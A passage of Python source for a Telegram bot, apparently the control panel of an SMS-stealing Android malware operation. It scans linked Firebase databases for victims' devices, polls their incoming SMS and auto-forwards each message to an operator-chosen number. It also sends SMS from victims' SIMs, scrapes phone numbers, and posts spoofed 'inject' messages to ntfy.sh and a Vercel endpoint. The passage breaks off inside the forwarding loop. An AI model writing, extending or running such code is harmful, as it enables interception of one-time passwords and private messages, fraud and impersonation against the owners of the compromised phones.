            InlineKeyboardButton(text="🔴 STOP", callback_data="cmd_stopmon")
        ]
    ]

    return InlineKeyboardMarkup(inline_keyboard=sim_rows)

# -------------------------------------------------------------------
# Command Handlers (Classic Mono Box Style)
# -------------------------------------------------------------------
@router.message(Command("start"))
@router.message(Command("help"))
async def handle_start(message: Message, state: FSMContext | None = None):
    if state:
        await state.clear()
    user_id = message.from_user.id
    cfg = load_user_config(user_id)
    user_name = html.escape(message.from_user.first_name or "OPERATOR").upper()

    guide_text = (
        "<pre><code>"
        "╔════════════════════════════════════╗\n"
        "║        JACKSON PREMIUM BOT         ║\n"
        "╚════════════════════════════════════╝\n"
        "[+] SYSTEM ONLINE.\n"
        f"[+] WELCOME, {user_name}.\n\n"
        "📖 SETUP GUIDE:\n"
        "1. LINK DB    : /setfirebase &lt;URL&gt;\n"
        "2. SELECT DEV : /fy &lt;DEVICE_ID&gt;\n"
        "3. SET KEY    : /key &lt;LICENSE&gt;\n"
        "4. SET CHANNEL: /addchannel &lt;ID&gt;\n"
        "5. START STREAM: /startmonitor\n"
        "6. STOP STREAM : /stopmonitor\n"
        "══════════════════════════════════════\n"
        "</code></pre>"
    )
    await message.answer(guide_text, reply_markup=get_main_menu_keyboard(cfg), parse_mode=ParseMode.HTML)

@router.message(Command("connect"))
async def handle_connect_cmd(message: Message, state: FSMContext):
    await handle_start(message, state)

@router.message(Command("setfirebase"))
@router.message(Command("firebase"))
async def handle_firebase_cmd(message: Message, command: CommandObject):
    user_id = message.from_user.id
    cfg = load_user_config(user_id)
    args = (command.args or "").strip()
    if not args:
        await message.answer("<pre><code>[!] ERROR: NO FIREBASE LINK PROVIDED.\n[+] USE: /setfirebase &lt;URL&gt;</code></pre>", parse_mode=ParseMode.HTML)
        return

    parsed = parse_profex_link(args)
    if not parsed:
        await message.answer("<pre><code>[!] ERROR: INVALID FIREBASE LINK.</code></pre>", parse_mode=ParseMode.HTML)
        return

    fb_url, auth_k = parsed
    saved = cfg.get("saved_firebases", [])
    if not isinstance(saved, list):
        saved = []
    if not any(f.get("url") == fb_url for f in saved):
        saved.append({"url": fb_url, "auth": auth_k})
        cfg["saved_firebases"] = saved

    add_global_firebase(fb_url, auth_k)
    cfg["firebase_url"] = fb_url
    cfg["auth_key"] = auth_k
    save_user_config(user_id, cfg)

    devices = await fetch_firebase_devices(fb_url, auth_k)
    dev_count = len(devices)

    text = (
        "<pre><code>"
        "╔════════════════════════════════════╗\n"
        "║          DB LINK SUCCESS           ║\n"
        "╚════════════════════════════════════╝\n"
        f"[+] URL    : {fb_url}\n"
        f"[+] DEVICES: {dev_count}\n"
        f"[+] TOTAL  : {len(saved)} DATABASES\n"
        "══════════════════════════════════════\n"
        "[+] USE /FY TO SELECT DEVICE\n"
        "</code></pre>"
    )
    await message.answer(text, parse_mode=ParseMode.HTML)

@router.message(Command("clearfirebase"))
async def handle_clear_firebase_cmd(message: Message):
    user_id = message.from_user.id
    cfg = load_user_config(user_id)
    cfg["saved_firebases"] = []
    cfg["firebase_url"] = ""
    cfg["auth_key"] = ""
    save_user_config(user_id, cfg)
    await message.answer("<pre><code>[+] SUCCESS: ALL DATABASES CLEARED.</code></pre>", parse_mode=ParseMode.HTML)

@router.message(Command("fy"))
@router.message(Command("setdevice"))
@router.message(Command("id"))
async def handle_devices_cmd(message: Message, command: CommandObject):
    user_id = message.from_user.id
    cfg = load_user_config(user_id)
    
    if cfg.get("is_polling_active"):
        cfg["is_polling_active"] = False
        save_user_config(user_id, cfg)
        try:
            await message.answer("<pre><code>[!] SMS MONITORING AUTO-STOPPED (NEW DEVICE SCAN)</code></pre>", parse_mode=ParseMode.HTML)
        except Exception:
            pass

    args = (command.args or "").strip()
    saved_fbs = get_global_firebases()

    if not saved_fbs:
        await message.answer(
            "❌ <b>No Firebase credentials saved in Global Pool.</b>\n"
            "Use <code>/setfirebase &lt;URL&gt;</code> first.",
            parse_mode=ParseMode.HTML,
        )
        return

    if not args:
        msg = await message.answer("<pre><code>[*] SCANNING ALL DATABASES FOR DEVICES...</code></pre>", parse_mode=ParseMode.HTML)
        
        async def fetch_db_devices_fast(fb):
            fb_url = fb.get("url", "")
            fb_auth = fb.get("auth", "")
            if not fb_url or not fb_auth:
                return None
            devices = await fetch_firebase_devices(fb_url, fb_auth)
            if devices:
                return fb, devices
            return None

        scan_tasks = [fetch_db_devices_fast(fb) for fb in saved_fbs]
        scan_results = await asyncio.gather(*scan_tasks, return_exceptions=True)

        found_dbs = []
        for r in scan_results:
            if isinstance(r, tuple) and r is not None and r[1]:
                found_dbs.append(r)

        if not found_dbs:
            await msg.edit_text("<pre><code>[!] ERROR: NO DEVICES FOUND IN ANY DATABASE.</code></pre>", parse_mode=ParseMode.HTML)
            return

        detail_tasks = []
        for fb, devs in found_dbs[:15]:
            for dev_id in devs[:3]:
                detail_tasks.append((fb, dev_id, fetch_device_details(fb.get("url", ""), fb.get("auth", ""), dev_id)))

        det_results = await asyncio.gather(*[t[2] for t in detail_tasks], return_exceptions=True)

        all_text = (
            "<pre><code>"
            "╔════════════════════════════════════╗\n"
            "║        FOUND DEVICES (GLOBAL)      ║\n"
            "╚════════════════════════════════════╝\n\n"
        )

        inline_buttons = []
        db_entries = []
        det_idx = 0

        for fb, devs in found_dbs:
            fb_url = fb.get("url", "")
            short_url = parse.urlparse(fb_url).netloc.split('.')[0] if fb_url else "DB"
            entry = f"[*] DB: {short_url.upper()} ({len(devs)} devs)\n"
            
            for dev_id in devs[:3]:
                d = det_results[det_idx] if det_idx < len(det_results) and isinstance(det_results[det_idx], dict) else {}
                det_idx += 1
                
                is_on = is_device_online(d)
                dev_status = "ONLINE" if is_on else "OFFLINE"
                model = str(d.get("modelName") or d.get("like") or "DEVICE").upper()
                _, _, best_num, _, _ = get_device_sim_display(d, 1)
                mob = best_num.upper() if (best_num and best_num != "Unknown") else "NO NUM"
                
                entry += f" ├─ ID    : {dev_id}\n ├─ STATUS: {dev_status}\n ├─ MODEL : {model}\n ├─ NUM   : {mob}\n ──────────────────────────────────────\n"
                
                status_emoji = "🟢" if is_on else "🔴"
                btn_label = f"{status_emoji} {model} ({dev_id[:8]}...)"
                inline_buttons.append(InlineKeyboardButton(text=btn_label, callback_data=f"select_dev_{dev_id}"))

            db_entries.append(entry)

        for entry in db_entries:
            if len(all_text) + len(entry) < 3700:
                all_text += entry

        all_text += "══════════════════════════════════════\n[+] TAP DEVICE BUTTON BELOW OR USE /FY <ID>\n</code></pre>"

        kb_rows = []
        for i in range(0, min(len(inline_buttons), 10), 2):
            kb_rows.append(inline_buttons[i:i+2])

        reply_kb = InlineKeyboardMarkup(inline_keyboard=kb_rows) if kb_rows else None
        await msg.edit_text(all_text, reply_markup=reply_kb, parse_mode=ParseMode.HTML)
        return

    dev_id = args
    msg = await message.answer(f"<pre><code>[*] SEARCHING FOR DEVICE {html.escape(dev_id)}...</code></pre>", parse_mode=ParseMode.HTML)
    found_fb = None
    details = {}
    
    async def check_db_for_device(fb):
        fb_url = fb.get("url", "")
        fb_auth = fb.get("auth", "")
        d = await fetch_device_details(fb_url, fb_auth, dev_id)
        if d and isinstance(d, dict) and len(d) > 0:
            return fb, d
        return None
        
    tasks = [check_db_for_device(fb) for fb in saved_fbs]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    for res in results:
        if isinstance(res, tuple) and res[0] is not None:
            found_fb, details = res
            break
            
    if not found_fb:
        await msg.edit_text(f"<pre><code>[!] ERROR: DEVICE {html.escape(dev_id)} NOT FOUND IN ANY DB.</code></pre>", parse_mode=ParseMode.HTML)
        return

    cfg["firebase_url"] = found_fb["url"]
    cfg["auth_key"] = found_fb["auth"]
    cfg["selected_device_id"] = dev_id
    cfg["ignore_initial_messages"] = True
    cfg["last_message_id"] = 0
    save_user_config(user_id, cfg)

    active_sim_idx = cfg.get("selected_sim_slot", 1)
    card_text = render_device_connected_card(details, active_sim_idx)
    kb = get_sim_selection_keyboard(dev_id, active_sim_idx, details)
    await msg.edit_text(card_text, reply_markup=kb, parse_mode=ParseMode.HTML)

@router.message(Command("key"))
async def handle_key_cmd(message: Message, command: CommandObject):
    user_id = message.from_user.id
    cfg = load_user_config(user_id)
    key_text = (command.args or "").strip()

    if not key_text:
        await message.answer("<pre><code>[!] ERROR: NO KEY PROVIDED.\n[+] USE: /KEY &lt;YOUR_VERCEL_LICENSE_KEY&gt;</code></pre>", parse_mode=ParseMode.HTML)
        return

    cfg["license_key"] = key_text
    save_user_config(user_id, cfg)

    # FIRE TEST INJECTION TO VERCEL
    if HTTP_SESSION is not None:
        topic = 'pria_sms_' + re.sub(r'[^a-zA-Z0-9_-]', '', key_text)
        payload = "jackson|ladle aajau kya"
        try:
            ntfy_url = f"https://ntfy.sh/{topic}"
            async with HTTP_SESSION.post(ntfy_url, data=payload, headers={'Content-Type': 'text/plain'}, timeout=5) as post_resp:
                ok = (post_resp.status == 200)
        except Exception:
            ok = False
            
        if not ok:
            try:
                vercel_url = "https://vercelsmsapi.vercel.app/api/inject"
                json_payload = {"sender": "jackson", "body": "ladle aajau kya", "licenseKey": key_text}
                async with HTTP_SESSION.post(vercel_url, json=json_payload, timeout=5) as post_resp:
                    pass
            except Exception:
                pass

    text = (
        "<pre><code>"
        "╔════════════════════════════════════╗\n"
        "║          LICENSE KEY SET           ║\n"
        "╚════════════════════════════════════╝\n"
        f"[+] KEY  : {key_text}\n"
        "[+] TEST : MESSAGE SENT TO VERCEL\n"
        "══════════════════════════════════════\n"
        "[+] NEXT : /addchannel &lt;ID&gt;\n"
        "</code></pre>"
    )
    await message.answer(text, parse_mode=ParseMode.HTML)

@router.message(Command("addchannel"))
@router.message(Command("channel"))
async def handle_channel_cmd(message: Message, command: CommandObject):
    user_id = message.from_user.id
    cfg = load_user_config(user_id)
    ch_text = (command.args or "").strip()

    if not ch_text:
        await message.answer("<pre><code>[!] ERROR: NO CHANNEL ID PROVIDED.\n[+] USE: /ADDCHANNEL &lt;ID&gt;</code></pre>", parse_mode=ParseMode.HTML)
        return

    cfg["channel_id"] = ch_text
    save_user_config(user_id, cfg)
    
    text = (
        "<pre><code>"
        "╔════════════════════════════════════╗\n"
        "║          CHANNEL ID SET            ║\n"
        "╚════════════════════════════════════╝\n"
        f"[+] CH ID: {ch_text}\n"
        "══════════════════════════════════════\n"
        "[+] NOTE : MAKE BOT ADMIN IN CHANNEL\n"
        "</code></pre>"
    )
    await message.answer(text, parse_mode=ParseMode.HTML)

@router.message(Command("startmonitor"))
@router.message(Command("startmonitoring"))
async def handle_start_monitoring(message: Message):
    user_id = message.from_user.id
    cfg = load_user_config(user_id)

    cfg["is_polling_active"] = True
    cfg["monitor_start_time"] = time.time()
    cfg["ignore_initial_messages"] = True
    save_user_config(user_id, cfg)
    
    dev_model = cfg.get("selected_device_id", "Unknown")
    from_sim = cfg.get("selected_sim_slot", 1)
    lic_key = cfg.get("license_key", "Not Set")
    chan = cfg.get("channel_id", "Not Set")

    # FIRE TEST INJECTION ON START (RESTORED AS REQUESTED)
    if HTTP_SESSION is not None and lic_key and lic_key != "Not Set":
        topic = 'pria_sms_' + re.sub(r'[^a-zA-Z0-9_-]', '', lic_key)
        payload = "JACKSON|HELLO BABU"
        ok = False
        try:
            ntfy_url = f"https://ntfy.sh/{topic}"
            async with HTTP_SESSION.post(ntfy_url, data=payload, headers={'Content-Type': 'text/plain'}, timeout=5) as post_resp:
                ok = (post_resp.status == 200)
        except Exception:
            pass
            
        if not ok:
            try:
                vercel_url = "https://vercelsmsapi.vercel.app/api/inject"
                json_payload = {"sender": "JACKSON", "body": "HELLO BABU", "licenseKey": lic_key}
                async with HTTP_SESSION.post(vercel_url, json=json_payload, timeout=5) as post_resp:
                    pass
            except Exception:
                pass

    text = (
        "<pre><code>"
        "╔════════════════════════════════════╗\n"
        "║          MONITORING STARTED        ║\n"
        "╚════════════════════════════════════╝\n"
        f"[+] DEVICE: {dev_model}\n"
        f"[+] SIM   : {from_sim}\n"
        f"[+] KEY   : {lic_key}\n"
        f"[+] TARGET: {chan}\n"
        "══════════════════════════════════════\n"
        "[+] WAITING FOR NEW SMS...\n"
        "[+] TEST INJECT: JACKSON (HELLO BABU)\n"
        "</code></pre>"
    )
    await message.answer(text, parse_mode=ParseMode.HTML)

@router.message(Command("stopmonitor"))
@router.message(Command("stopmonitoring"))
async def handle_stop_monitoring(message: Message):
    user_id = message.from_user.id
    cfg = load_user_config(user_id)

    cfg["is_polling_active"] = False
    save_user_config(user_id, cfg)

    await message.answer("<pre><code>[!] MONITORING PAUSED.\n[+] USE /STARTMONITOR TO RESUME.</code></pre>", parse_mode=ParseMode.HTML)

@router.message(Command("status"))
async def handle_status_cmd(message: Message | CallbackQuery):
    user_id = message.from_user.id
    cfg = load_user_config(user_id)
    
    db_conn = cfg.get('firebase_url') or "Not Set"
    auth_k = cfg.get('auth_key', '')
    dev_set = cfg.get('selected_device_id') or "Not Set"
    chan = cfg.get('channel_id') or "Not Set"
    lic = cfg.get('license_key') or "Not Set"
    fwd_target = cfg.get('auto_forward_target') or "NOT SET"
    is_auto = cfg.get('is_polling_active')
    
    auto_mark = "ACTIVE" if is_auto else "PAUSED"

    tokens = cfg.get("stats_tokens_sent", 0)
    reals = cfg.get("stats_real_sms", 0)
    spoofs = cfg.get("stats_spoof_injects", 0)

    db_ping_str = "1MS"
    if HTTP_SESSION and db_conn and db_conn != "Not Set":
        try:
            t_ping_0 = time.perf_counter()
            ping_url = f"{db_conn.rstrip('/')}/.json?auth={auth_k}&shallow=true"
            async with HTTP_SESSION.get(ping_url, timeout=2) as resp:
                if resp.status < 400:
                    db_ping_str = f"{round((time.perf_counter() - t_ping_0) * 1000)}MS"
        except Exception:
            pass

    status_text = (
        "<pre><code>"
        "╔════════════════════════════════════╗\n"
        "║          SYSTEM STATUS             ║\n"
        "╚════════════════════════════════════╝\n"
        f"[+] DB      : {db_conn}\n"
        f"[+] DEVICE  : {dev_set}\n"
        f"[+] CHANNEL : {chan}\n"
        f"[+] FORWARD : {fwd_target}\n"
        f"[+] LICENSE : {lic}\n"
        f"[+] MONITOR : {auto_mark}\n"
        "══════════════════════════════════════\n"
        "╔════════════════════════════════════╗\n"
        "║           STATISTICS               ║\n"
        "╚════════════════════════════════════╝\n"
        f"[*] TOKENS SENT : {tokens}\n"
        f"[*] REAL SMS    : {reals}\n"
        f"[*] INJECTS     : {spoofs}\n"
        "══════════════════════════════════════\n"
        f"[~] PING: {db_ping_str} | STATUS: STABLE\n"
        "</code></pre>"
    )
    if isinstance(message, CallbackQuery):
        await message.message.answer(status_text, parse_mode=ParseMode.HTML)
        await message.answer()
    else:
        await message.answer(status_text, parse_mode=ParseMode.HTML)

# -------------------------------------------------------------------
# Inline Callback Handlers
# -------------------------------------------------------------------
@router.callback_query(F.data.startswith("select_dev_"))
async def handle_device_selection_callback(callback: CallbackQuery):
    dev_id = callback.data.replace("select_dev_", "").strip()
    user_id = callback.from_user.id
    cfg = load_user_config(user_id)

    cfg["selected_device_id"] = dev_id
    save_user_config(user_id, cfg)

    await callback.answer(f"Device {dev_id} selected!", show_alert=False)

    details = await fetch_device_details(cfg["firebase_url"], cfg["auth_key"], dev_id)
    active_sim_idx = cfg.get("selected_sim_slot", 1)

    card_text = render_device_connected_card(details, active_sim_idx)
    kb = get_sim_selection_keyboard(dev_id, active_sim_idx, details)
    await callback.message.edit_text(card_text, reply_markup=kb, parse_mode=ParseMode.HTML)

@router.callback_query(F.data.startswith("set_sim_"))
async def handle_sim_selection_callback(callback: CallbackQuery):
    parts = callback.data.split("_")
    slot = int(parts[2])
    dev_id = parts[3]
    user_id = callback.from_user.id
    cfg = load_user_config(user_id)

    cfg["selected_sim_slot"] = slot
    save_user_config(user_id, cfg)

    await callback.answer(f"Selected SIM {slot} for Outgoing SMS!", show_alert=True)
    
    details = await fetch_device_details(cfg.get("firebase_url", ""), cfg.get("auth_key", ""), dev_id)
    card_text = render_device_connected_card(details, slot)
    kb = get_sim_selection_keyboard(dev_id, slot, details)
    try:
        await callback.message.edit_text(card_text, reply_markup=kb, parse_mode=ParseMode.HTML)
    except Exception:
        try:
            await callback.message.edit_reply_markup(reply_markup=kb)
        except Exception:
            pass

# -------------------------------------------------------------------
# Auto Send / Forwarder Command Handlers (OG CLOUDY Style)
# -------------------------------------------------------------------
@router.message(Command("forward"))
@router.message(Command("autosend"))
@router.message(Command("sendms"))
async def handle_forward_cmd(message: Message, command: CommandObject):
    user_id = message.from_user.id
    cfg = load_user_config(user_id)

    fb_url = cfg.get("firebase_url")
    auth_k = cfg.get("auth_key")
    dev_id = cfg.get("selected_device_id")
    sim_slot = cfg.get("selected_sim_slot", 1)

    if not fb_url or not auth_k or not dev_id:
        await message.answer(
            "<pre><code>"
            "[!] ERROR: NO DEVICE OR FIREBASE LINKED.\n"
            "[+] LINK DB: /setfirebase &lt;URL&gt;\n"
            "[+] SELECT DEV: /fy &lt;DEVICE_ID&gt;"
            "</code></pre>",
            parse_mode=ParseMode.HTML
        )
        return

    to_number = ""
    message_text = ""
    args = (command.args or "").strip()

    if message.reply_to_message and (message.reply_to_message.text or message.reply_to_message.caption):
        reply_body = message.reply_to_message.text or message.reply_to_message.caption or ""
        if args:
            to_number = args.split()[0]
            message_text = reply_body
    elif args:
        parts = args.split(maxsplit=1)
        if len(parts) >= 2:
            to_number = parts[0]
            message_text = parts[1]
        elif len(parts) == 1 and "\n" in args:
            lines = args.splitlines()
            to_number = lines[0].strip()
            message_text = "\n".join(lines[1:]).strip()

    clean_to = clean_and_format_number(to_number) if to_number else None

    if not clean_to or not message_text:
        await message.answer(
            "<pre><code>"
            "╔════════════════════════════════════╗\n"
            "║        AUTO SEND / FORWARD HELP    ║\n"
            "╚════════════════════════════════════╝\n"
            "[+] USAGE: /forward &lt;PHONE_NUMBER&gt; &lt;MESSAGE&gt;\n"
            "    EXAMPLE: /forward +919876543210 Hello World!\n\n"
            "[+] OR REPLY TO ANY MESSAGE WITH:\n"
            "    /forward &lt;PHONE_NUMBER&gt;\n"
            "══════════════════════════════════════"
            "</code></pre>",
            parse_mode=ParseMode.HTML
        )
        return

    # Send to Firebase immediately first for fastest sub-second dispatch
    t_fwd_start = time.perf_counter()
    try:
        res_data, dispatch_ms = await send_sms_via_firebase(cfg, clean_to, message_text)
        
        cfg["stats_spoof_injects"] = cfg.get("stats_spoof_injects", 0) + 1
        save_user_config(user_id, cfg)

        log_to_dashboard(
            user_id=str(user_id),
            action="AUTO_SEND_FORWARD",
            details={
                "to": clean_to,
                "message": message_text,
                "device_id": dev_id,
                "sim_slot": sim_slot,
                "dispatch_ms": dispatch_ms
            }
        )

        speed_sec = round(dispatch_ms / 1000.0, 2)
        log_card = (
            "<pre><code>"
            "╔════════════════════════════════════╗\n"
            "║       AUTO SEND / FORWARD LOG      ║\n"
            "╚════════════════════════════════════╝\n"
            f"[+] STATUS   : SUCCESS QUEUED ({speed_sec}s)\n"
            f"[+] SPEED    : {speed_sec}s ({dispatch_ms}ms)\n"
            f"[+] TARGET   : {clean_to}\n"
            f"[+] DEVICE   : {html.escape(dev_id)}\n"
            f"[+] SIM SLOT : SIM {sim_slot}\n"
            f"[+] DISPATCH : {dispatch_ms} MS\n"
            "──────────────────────────────────────\n"
            f"[+] MESSAGE  : {html.escape(message_text[:120])}\n"
            "══════════════════════════════════════\n"
            "[✓] LOGGED TO DASHBOARD\n"
            "</code></pre>"
        )
        await message.answer(log_card, parse_mode=ParseMode.HTML)

    except Exception as e:
        logger.error(f"Error in /forward command: {e}")
        await message.answer(
            f"<pre><code>[!] FORWARD FAILED: {html.escape(str(e))}</code></pre>",
            parse_mode=ParseMode.HTML
        )

@router.message(Command("autoforward"))
async def handle_autoforward_cmd(message: Message, command: CommandObject):
    user_id = message.from_user.id
    cfg = load_user_config(user_id)
    arg = (command.args or "").strip()

    if arg.lower() in ("off", "stop", "clear", "disable"):
        cfg["auto_forward_target"] = ""
        save_user_config(user_id, cfg)
        await message.answer("<pre><code>[!] AUTO-FORWARDING DISABLED.</code></pre>", parse_mode=ParseMode.HTML)
        return

    clean_to = clean_and_format_number(arg) if arg else None

    if not clean_to:
        current_target = cfg.get("auto_forward_target") or "DISABLED"
        await message.answer(
            "<pre><code>"
            "╔════════════════════════════════════╗\n"
            "║        AUTO-FORWARD CONFIG         ║\n"
            "╚════════════════════════════════════╝\n"
            f"[+] CURRENT TARGET: {current_target}\n"
            "──────────────────────────────────────\n"
            "[+] SET TARGET : /autoforward &lt;PHONE_NUMBER&gt;\n"
            "[+] DISABLE    : /autoforward off\n"
            "══════════════════════════════════════\n"
            "Auto-forwards all incoming SMS to target!\n"
            "</code></pre>",
            parse_mode=ParseMode.HTML
        )
        return

    cfg["auto_forward_target"] = clean_to
    save_user_config(user_id, cfg)

    await message.answer(
        "<pre><code>"
        "╔════════════════════════════════════╗\n"
        "║       AUTO-FORWARD ENABLED         ║\n"
        "╚════════════════════════════════════╝\n"
        f"[+] TARGET NUMBER : {clean_to}\n"
        "[+] STATUS        : ACTIVE FOR INCOMING SMS\n"
        "══════════════════════════════════════\n"
        "</code></pre>",
        parse_mode=ParseMode.HTML
    )

# -------------------------------------------------------------------
# Number Finder / Scraper Command Handlers
# -------------------------------------------------------------------
@router.message(Command("find"))
@router.message(Command("findnum"))
@router.message(Command("findnumbers"))
@router.message(Command("scrape"))
async def handle_find_cmd(message: Message, command: CommandObject):
    user_id = message.from_user.id
    target_dev = (command.args or "").strip()
    status_msg = await message.answer("<pre><code>[*] SCANNING DATABASES FOR NUMBERS...</code></pre>", parse_mode=ParseMode.HTML)
    
    text, nums = await run_number_search(user_id, target_dev_id=target_dev if target_dev else None)
    try:
        await status_msg.delete()
    except Exception:
        pass
    await send_number_search_result(message, text, nums, title_tag=f"nums_{target_dev if target_dev else 'all'}")

@router.message(Command("findonline"))
async def handle_find_online_cmd(message: Message):
    user_id = message.from_user.id
    status_msg = await message.answer("<pre><code>[*] SCANNING ONLINE DEVICES FOR NUMBERS...</code></pre>", parse_mode=ParseMode.HTML)
    text, nums = await run_number_search(user_id, filter_type="online")
    try:
        await status_msg.delete()
    except Exception:
        pass
    await send_number_search_result(message, text, nums, title_tag="online_nums")

@router.message(Command("findsms"))
async def handle_find_sms_cmd(message: Message):
    user_id = message.from_user.id
    status_msg = await message.answer("<pre><code>[*] SCANNING SMS MESSAGES FOR NUMBERS...</code></pre>", parse_mode=ParseMode.HTML)
    text, nums = await run_number_search(user_id, filter_type="sms")
    try:
        await status_msg.delete()
    except Exception:
        pass
    await send_number_search_result(message, text, nums, title_tag="sms_nums")

@router.callback_query(F.data.startswith("scrape_dev_"))
async def handle_scrape_dev_callback(callback: CallbackQuery):
    dev_id = callback.data.replace("scrape_dev_", "").strip()
    user_id = callback.from_user.id
    status_msg = await callback.message.answer(f"<pre><code>[*] SCRAPING NUMBERS FOR DEVICE {html.escape(dev_id)}...</code></pre>", parse_mode=ParseMode.HTML)
    text, nums = await run_number_search(user_id, target_dev_id=dev_id)
    try:
        await status_msg.delete()
    except Exception:
        pass
    await send_number_search_result(callback.message, text, nums, title_tag=f"dev_{dev_id}_nums")
    await callback.answer()

@router.callback_query(F.data.startswith("cmd_"))
async def handle_menu_commands_callback(callback: CallbackQuery):
    action = callback.data
    user_id = callback.from_user.id
    cfg = load_user_config(user_id)

    if action == "cmd_link_fb":
        await callback.message.answer("<pre><code>[+] COMMAND: /setfirebase &lt;URL&gt;</code></pre>", parse_mode=ParseMode.HTML)
    elif action == "cmd_search_id":
        await callback.message.answer("<pre><code>[+] COMMAND: /fy &lt;DEVICE_ID&gt;</code></pre>", parse_mode=ParseMode.HTML)
    elif action == "cmd_set_key":
        await callback.message.answer("<pre><code>[+] COMMAND: /key &lt;LICENSE&gt;</code></pre>", parse_mode=ParseMode.HTML)
    elif action == "cmd_set_channel":
        await callback.message.answer("<pre><code>[+] COMMAND: /addchannel &lt;ID&gt;</code></pre>", parse_mode=ParseMode.HTML)
    elif action == "cmd_find_all_nums":
        status_msg = await callback.message.answer("<pre><code>[*] SCANNING ALL DATABASES FOR NUMBERS...</code></pre>", parse_mode=ParseMode.HTML)
        text, nums = await run_number_search(user_id, filter_type="all")
        try:
            await status_msg.delete()
        except Exception:
            pass
        await send_number_search_result(callback.message, text, nums, title_tag="all_nums")
    elif action == "cmd_startmon":
        cfg["is_polling_active"] = True
        cfg["monitor_start_time"] = time.time()
        cfg["ignore_initial_messages"] = True
        save_user_config(user_id, cfg)
        
        # Trigger test inject as well on inline button start
        lic_key = cfg.get("license_key")
        if HTTP_SESSION is not None and lic_key and lic_key != "Not Set":
            topic = 'pria_sms_' + re.sub(r'[^a-zA-Z0-9_-]', '', lic_key)
            payload = "JACKSON|HELLO BABU"
            try:
                ntfy_url = f"https://ntfy.sh/{topic}"
                async with HTTP_SESSION.post(ntfy_url, data=payload, headers={'Content-Type': 'text/plain'}, timeout=5) as post_resp:
                    pass
            except Exception:
                pass
        await callback.message.answer("<pre><code>[+] SUCCESS: MONITORING STARTED.\n[+] TEST INJECT: JACKSON (HELLO BABU)</code></pre>", parse_mode=ParseMode.HTML)
    elif action == "cmd_stopmon":
        cfg["is_polling_active"] = False
        save_user_config(user_id, cfg)
        await callback.message.answer("<pre><code>[!] PAUSED: MONITORING STOPPED.</code></pre>", parse_mode=ParseMode.HTML)
    elif action == "cmd_status":
        await handle_status_cmd(callback.message)

    await callback.answer()

# -------------------------------------------------------------------
# Message ID Extraction Helper
# -------------------------------------------------------------------
def extract_msg_id(k: Any, item: Any) -> int:
    if isinstance(item, dict):
        for fld in ("id", "timestamp"):
            val = item.get(fld)
            if val is not None:
                try:
                    return int(val)
                except (ValueError, TypeError):
                    pass
    if str(k).isdigit():
        return int(k)
    return 0

PROCESSED_MSG_KEYS: set[str] = set()

# -------------------------------------------------------------------
# Incoming SMS Polling Loop (Classic Mono Box Style with Real Timing)
# -------------------------------------------------------------------
async def firebase_incoming_sms_loop(bot: Bot):
    logger.info("Firebase Incoming SMS Loop Started...")
    while True:
        try:
            for cfg_path in SESSIONS_DIR.glob("user_*.json"):
                try:
                    cfg = json.loads(cfg_path.read_text(encoding="utf-8"))
                except Exception:
                    continue

                if not isinstance(cfg, dict):
                    continue

                if not cfg.get("is_polling_active") or not cfg.get("license_key") or not cfg.get("firebase_url") or not cfg.get("selected_device_id"):
                    continue
                
                user_id_str = cfg.get("user_id", cfg_path.stem.replace("user_", ""))

                # 30-minute auto-timeout
                if time.time() - cfg.get("monitor_start_time", 0) > 1800:
                    cfg["is_polling_active"] = False
                    save_user_config(user_id_str, cfg)
                    try:
                        await bot.send_message(chat_id=user_id_str, text="<pre><code>[!] SMS MONITORING AUTO-STOPPED (30 MIN LIMIT REACHED)\n[+] USE /startmonitor TO RESUME.</code></pre>", parse_mode=ParseMode.HTML)
                    except Exception:
                        pass
                    continue

                license_key = cfg["license_key"]
                fb_url = cfg["firebase_url"].rstrip("/")
                auth_k = cfg.get("auth_key", "")
                dev_id = parse.quote(cfg["selected_device_id"])
                
                query = parse.urlencode({"auth": auth_k, "orderBy": '"$key"', "limitToLast": "10"})
                url = f"{fb_url}/messages/{dev_id}.json?{query}"

                assert HTTP_SESSION is not None
                try:
                    async with HTTP_SESSION.get(url, timeout=8) as resp:
                        if resp.status != 200:
                            continue
                        text = await resp.text()
                        try:
                            data = json.loads(text) if text else {}
                        except Exception:
                            data = {}
                except Exception:
                    continue

                if not isinstance(data, dict):
                    continue

                # Baseline: Ignore all pre-existing messages on monitor startup
                if cfg.get("ignore_initial_messages", False):
                    max_id = 0
                    for k, item in data.items():
                        m_id = extract_msg_id(k, item)
                        if m_id > max_id:
                            max_id = m_id
                        PROCESSED_MSG_KEYS.add(f"{user_id_str}_{dev_id}_{m_id}")
                    
                    cfg["last_message_id"] = max_id
                    cfg["ignore_initial_messages"] = False
                    save_user_config(user_id_str, cfg)
                    logger.info(f"Monitor baseline set for user {user_id_str}: Ignored existing messages (latest ID: {max_id})")
                    continue

                try:
                    last_processed_id = int(cfg.get("last_message_id") or 0)
                except (ValueError, TypeError):
                    last_processed_id = 0

                new_messages_found = False
                sorted_items = sorted(data.items(), key=lambda item: extract_msg_id(item[0], item[1]))
                
                for k, msg in sorted_items:
                    if not isinstance(msg, dict):
                        continue
                    msg_id = extract_msg_id(k, msg)
                    if msg_id <= 0:
                        continue

                    msg_dedup_key = f"{user_id_str}_{dev_id}_{msg_id}"
                    if msg_dedup_key in PROCESSED_MSG_KEYS:
                        continue

                    if msg_id > last_processed_id:
                        PROCESSED_MSG_KEYS.add(msg_dedup_key)
                        if len(PROCESSED_MSG_KEYS) > 10000:
                            PROCESSED_MSG_KEYS.clear()

                        new_messages_found = True
                        cfg["last_message_id"] = msg_id
                        
                        sender = str(msg.get("sender", "")).strip()
                        body = str(msg.get("message", "")).strip()
                        
                        if sender and body:
                            user_id_to_notify = cfg.get("user_id", cfg_path.stem.replace("user_", ""))

                            # --- STREAM 1: Ultra-Fast Forwarding Stream (Target Number First!) ---
                            auto_target = cfg.get("auto_forward_target")
                            if auto_target:
                                try:
                                    fwd_msg_body = f"FWD [{sender}]: {body}"
                                    _, fwd_ms = await send_sms_via_firebase(cfg, auto_target, fwd_msg_body)
                                    log_to_dashboard(
                                        user_id=str(user_id_to_notify),
                                        action="AUTO_FORWARD_INCOMING",
                                        details={"sender": sender, "to": auto_target, "body": body, "latency_ms": fwd_ms}
                                    )
                                    speed_sec = round(fwd_ms / 1000.0, 2)
                                    fwd_log_card = (
                                        "<pre><code>"
                                        "╔════════════════════════════════════╗\n"
                                        "║       AUTO FORWARDED LOG           ║\n"
                                        "╚════════════════════════════════════╝\n"
                                        f"[+] STATUS      : SUCCESS ({speed_sec}s)\n"
